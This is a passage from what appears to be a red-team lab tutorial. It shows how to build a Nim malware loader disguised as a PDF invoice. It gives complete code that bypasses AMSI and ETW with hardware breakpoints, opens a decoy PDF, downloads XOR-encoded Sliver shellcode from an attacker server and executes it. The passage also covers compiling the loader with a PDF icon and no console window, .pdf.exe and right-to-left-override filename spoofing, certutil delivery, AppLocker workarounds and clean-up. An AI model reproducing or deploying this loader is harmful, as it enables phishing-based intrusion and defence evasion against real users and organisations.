# If not installed: sudo apt install imagemagick
```

For a more authentic icon, extract the actual PDF icon from the victim Windows machine and transfer it to Kali. Look in `C:\Windows\System32\shell32.dll` or the Adobe Reader installation directory. Use Resource Hacker on Windows to extract the `.ico` file.

Compile the resource file once the `.ico` is verified:

```bash
cd /tmp
x86_64-w64-mingw32-windres pdf_icon.rc -O coff -o pdf_icon.res
```

This creates `pdf_icon.res` which you will link into your Nim binary during compilation.

### 6.6 Write the Fake PDF Loader

```bash
nano /tmp/fakepdf_loader.nim
```

```nim
import winim/lean
import winim/shell
import winim/winstr
import os
import httpclient
import strutils

# ============================================================
# CONFIGURATION
# ============================================================
const KALI_IP   = "192.168.10.10"
const KALI_PORT = "8888"
const SC_PATH   = "/beacon_encoded.bin"
const XOR_KEY   = 0xAB.byte

# ============================================================
# EMBEDDED DECOY PDF
# This is the real PDF that opens on screen to fool the user.
# Paste the output of pdf_to_nim.py here.
# For the lab, you can also fetch it from Kali at runtime
# instead of embedding it (smaller binary).
# ============================================================

# Option A: Fetch decoy from Kali at runtime (simpler for the lab)
# Option B: Embed decoy bytes directly (for real engagements - no network
#           fetch needed for the decoy, reduces suspicion)
#
# We will use Option A for the lab:
const DECOY_URL = "http://" & KALI_IP & ":" & KALI_PORT & "/decoy_invoice.pdf"

# ============================================================
# HARDWARE BREAKPOINT BYPASS (same as Methods 1 and 2)
# No memory patching. CPU debug registers intercept
# AmsiScanBuffer and EtwEventWrite without modifying code.
# ============================================================
var amsiScanBufferAddr: pointer = nil
var etwEventWriteAddr: pointer = nil

proc hwbpHandler(exInfo: PEXCEPTION_POINTERS): LONG {.stdcall.} =
  let rec = exInfo.ExceptionRecord
  let ctx = exInfo.ContextRecord
  if rec.ExceptionCode != STATUS_SINGLE_STEP:
    return EXCEPTION_CONTINUE_SEARCH
  let faultAddr = cast[pointer](ctx.Rip)
  if faultAddr == amsiScanBufferAddr:
    ctx.Rax = cast[DWORD64](0x80070057)
    ctx.Rip = cast[DWORD64](cast[ptr DWORD64](ctx.Rsp)[])
    ctx.Rsp = ctx.Rsp + 8
    ctx.EFlags = ctx.EFlags or 0x10000
    return EXCEPTION_CONTINUE_EXECUTION
  elif faultAddr == etwEventWriteAddr:
    ctx.Rax = 0
    ctx.Rip = cast[DWORD64](cast[ptr DWORD64](ctx.Rsp)[])
    ctx.Rsp = ctx.Rsp + 8
    ctx.EFlags = ctx.EFlags or 0x10000
    return EXCEPTION_CONTINUE_EXECUTION
  return EXCEPTION_CONTINUE_SEARCH

proc setHardwareBreakpoints() =
  let amsiDll = LoadLibraryA("amsi.dll")
  if amsiDll != 0:
    amsiScanBufferAddr = GetProcAddress(amsiDll, "AmsiScanBuffer")
  let ntdll = GetModuleHandleA("ntdll.dll")
  if ntdll != 0:
    etwEventWriteAddr = GetProcAddress(ntdll, "EtwEventWrite")
  discard AddVectoredExceptionHandler(1, hwbpHandler)
  var ctx: CONTEXT
  ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
  let hThread = GetCurrentThread()
  discard GetThreadContext(hThread, addr ctx)
  if amsiScanBufferAddr != nil:
    ctx.Dr0 = cast[DWORD64](amsiScanBufferAddr)
  if etwEventWriteAddr != nil:
    ctx.Dr1 = cast[DWORD64](etwEventWriteAddr)
  ctx.Dr7 = 0x00000005
  discard SetThreadContext(hThread, addr ctx)

# ============================================================
# DECOY: Drop and open the real PDF
# This is the first thing that happens so the user sees
# the document immediately and does not get suspicious.
# ============================================================
proc openDecoyPdf() =
  let tempDir = getEnv("TEMP")
  let pdfPath = tempDir & "\\Invoice_June2026.pdf"

  var client = newHttpClient()
  try:
    let pdfData = client.getContent(DECOY_URL)
    writeFile(pdfPath, pdfData)
  except:
    return

  discard ShellExecuteA(
    0, "open", pdfPath, nil, nil, SW_SHOWNORMAL
  )

# ============================================================
# SHELLCODE RUNNER (callback execution, same as Methods 1/2)
# ============================================================
proc runShellcode() =
  let url = "http://" & KALI_IP & ":" & KALI_PORT & SC_PATH
  var client = newHttpClient()
  var encoded: string
  try:
    encoded = client.getContent(url)
  except:
    return

  if encoded.len == 0:
    return

  var shellcode = newSeq[byte](encoded.len)
  for i in 0 ..< encoded.len:
    shellcode[i] = cast[byte](encoded[i]) xor XOR_KEY

  let scLen = shellcode.len.SIZE_T

  let mem = VirtualAlloc(nil, scLen, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if mem == nil: return

  copyMem(mem, addr shellcode[0], shellcode.len)
  zeroMem(addr shellcode[0], shellcode.len)
  sleep(500)

  var oldProtect: DWORD = 0
  discard VirtualProtect(mem, scLen, PAGE_EXECUTE_READ, addr oldProtect)

  # Execute via callback, not CreateThread
  discard EnumSystemLocalesA(
    cast[LOCALE_ENUMPROCA](mem),
    LCID_INSTALLED
  )

# ============================================================
# ENTRY POINT
# The order matters:
# 1. Open decoy PDF FIRST (user sees a document immediately)
# 2. Install HWBP on AMSI/ETW (no memory patching)
# 3. Run shellcode via callback (beacon fires while user
#    reads the PDF)
# ============================================================
when isMainModule:
  # Step 1: Open decoy PDF immediately
  openDecoyPdf()

  # Delay so the PDF reader steals focus
  sleep(1000)

  # Step 2: Install hardware breakpoints
  setHardwareBreakpoints()

  # Step 3: Run the shellcode via callback
  runShellcode()
```

### 6.7 Compile With the PDF Icon

This is the key step. You compile the Nim loader with the PDF icon embedded, and as a **GUI app** (not console) so no command prompt window flashes when the user double-clicks it:

```bash
nim c \
  -d:mingw \
  -d:release \
  --opt:size \
  --app:gui \
  --passL:-s \
  --cpu:amd64 \
  --passL:/tmp/pdf_icon.res \
  -o:"/tmp/Invoice_June2026.pdf.exe" \
  /tmp/fakepdf_loader.nim
```

Key differences from previous compiles:

| Flag | Why |
|------|-----|
| `--app:gui` | Compiles as a GUI application. No console window appears when the user runs it. This is critical. If a black command prompt flashes, the user knows something is wrong. |
| `--passL:/tmp/pdf_icon.res` | Links the PDF icon resource into the binary. Windows Explorer shows this icon for the file. |
| `-o:Invoice_June2026.pdf.exe` | The filename ends with `.pdf.exe`. See the next section for why. |

Check the output before doing any renaming:

```bash
ls -la "/tmp/Invoice_June2026.pdf.exe"
file "/tmp/Invoice_June2026.pdf.exe"
```

### 6.8 Why the Filename Trick Works

Windows hides file extensions by default. This is a setting called "Hide extensions for known file types" and it is ON by default on every Windows installation.

When this setting is on:
- `report.docx` shows as `report` with a Word icon
- `photo.jpg` shows as `photo` with an image icon
- `Invoice_June2026.pdf.exe` shows as `Invoice_June2026.pdf` with a PDF icon

The user sees `Invoice_June2026.pdf` with a PDF icon. They have no reason to suspect it is an executable.

If the target has extensions shown (some power users do), you can use the **Right-to-Left Override (RLO)** Unicode character trick:

```
Invoice_June2026[RLO]fdp.exe
```

The RLO character (`U+202E`) reverses the text direction of everything after it. So `fdp.exe` displays as `exe.pdf`. The full filename appears as:

```
Invoice_June2026exe.pdf
```

But it is still an `.exe` file. This trick is well-documented and works on Windows 11. To insert the RLO character on Linux:

```bash
# Rename using printf with the Unicode escape
mv "/tmp/Invoice_June2026.pdf.exe" "$(printf '/tmp/Invoice_June2026\xe2\x80\xaefdp.exe')"
```

After the rename, verify the file still exists (the original name is gone, use a wildcard):

```bash
ls -la /tmp/Invoice_June2026*
file /tmp/Invoice_June2026*
```

You will see the renamed file. The `file` command will still confirm it is a `PE32+ executable`.

For the lab, the simple `.pdf.exe` trick is sufficient since Windows hides extensions by default. If you did the RLO rename, note that the HTTP server serves it under the new filename — update the download URL on the victim accordingly.

### 6.9 Deliver to the Victim

Copy the fake PDF and the decoy PDF to Kali's HTTP server:

```bash
# Check which filename is in /tmp (depends on whether you did the RLO rename)
ls -la /tmp/Invoice_June2026*
ls /tmp/decoy_invoice.pdf
```

Both files are already in `/tmp/` which is being served on port 8888. Note the exact filename shown by `ls` — that is the name you use in the download URL on the victim.

On the victim, as `CORP\vamsi`, download the fake PDF to the Downloads folder (or Desktop, wherever is realistic):

```powershell
# Using Invoke-WebRequest to simulate a browser download
Invoke-WebRequest -Uri "http://192.168.10.10:8888/Invoice_June2026.pdf.exe" -OutFile "$env:USERPROFILE\Desktop\Invoice_June2026.pdf.exe"
```

Or use certutil to put it in a trusted AppLocker path:

```cmd
certutil.exe -urlcache -split -f http://192.168.10.10:8888/Invoice_June2026.pdf.exe C:\Windows\Temp\Invoice_June2026.pdf.exe
```

### 6.10 AppLocker Consideration

AppLocker will BLOCK the .exe from running if it is in Downloads (not a trusted path). You have two options:

**Option A:** Drop it in `C:\Windows\Temp\` (AppLocker trusted path). But this is unrealistic for a phishing scenario because no user downloads invoices to `C:\Windows\Temp\`.

**Option B:** Combine Method 3 with Method 2 (DLL sideloading). Instead of delivering a standalone EXE, deliver the DLL sideloading chain (BGInfo + version.dll) inside a ZIP. The "PDF" pretext becomes the email subject. The user downloads the ZIP, extracts it, runs the "BGInfo Setup" or whatever pretext you use. This bypasses AppLocker because DLL rules are off.

**Option C:** If AppLocker is not enforced on the target (many real-world environments only have Defender, not AppLocker), the user just double-clicks the file from Downloads and it runs. For the lab, you already have AppLocker configured, so use Option A.

For the lab:

```cmd
:: Run from the trusted path
C:\Windows\Temp\Invoice_June2026.pdf.exe
```

### 6.11 What Happens When the User Runs It

1. No console window appears (compiled as GUI app)
2. Within 1 second, the real `decoy_invoice.pdf` opens in the default PDF reader
3. The user sees a professional-looking invoice. They think they opened a PDF.
4. In the background, hardware breakpoints are set on AMSI and ETW (no memory modification)
5. The Sliver beacon shellcode is fetched from Kali, decoded, and executed via callback
6. Beacon fires

Check Sliver:

```
sliver > beacons
```

A new beacon appears as `CORP\vamsi`. Open it and queue a command:

```
sliver > use <beacon-id>
sliver (BEACON_NAME) > ps
```

Wait for the next check-in. In the process list you will see `Invoice_June2026.pdf.exe`. That is the process the beacon is running inside.

### 6.12 OPSEC Note for Method 3

What you leave behind:
- `Invoice_June2026.pdf.exe` on disk (wherever the user saved it)
- `Invoice_June2026.pdf` in the user's Temp folder (the dropped decoy)
- Prefetch entry for the EXE
- Network connections to `192.168.10.10:8888` (fetching decoy + beacon shellcode) and `:443` (C2 check-ins)
- A PDF reader process starting right after your EXE started (Process Monitor or Sysmon would show the parent-child relationship)

The biggest OPSEC risk: a defender checking Sysmon logs will see that a PDF reader was launched BY your executable, not by Explorer. That parent-child process relationship is abnormal and is a detection signal. In a real engagement, you would self-delete the EXE after execution using a scheduled task or a batch script that waits and deletes.

To clean up after the beacon is stable:

```
sliver (BEACON_NAME) > rm C:\Windows\Temp\Invoice_June2026.pdf.exe
sliver (BEACON_NAME) > execute -o cmd.exe /c del "%TEMP%\Invoice_June2026.pdf"
```

---

## Summary

You now have three working methods to land a Sliver beacon past Defender and AppLocker:

| Method | How | Best For | Stealth |
|--------|-----|----------|---------|
| Method 1: Nim EXE | Drop to C:\Windows\Temp, run directly | Quick lab testing, environments with weak monitoring | Medium |
| Method 2: DLL Sideload | BGInfo loads your version.dll proxy | Environments with EDR, need to run inside a trusted process | High |
| Method 3: Fake PDF | EXE with PDF icon opens real PDF as decoy | Phishing delivery, social engineering scenarios | High (user sees nothing suspicious) |

**Method 1** is your fast option.

**Method 2** is your stealth option against Defender and AppLocker.

**Method 3** is your social engineering option when the initial access depends on tricking a human.

All three give you the same result: a live Sliver beacon as `CORP\vamsi` that you will use in every module from here on.

---

Open `03-situational-awareness.md` next.


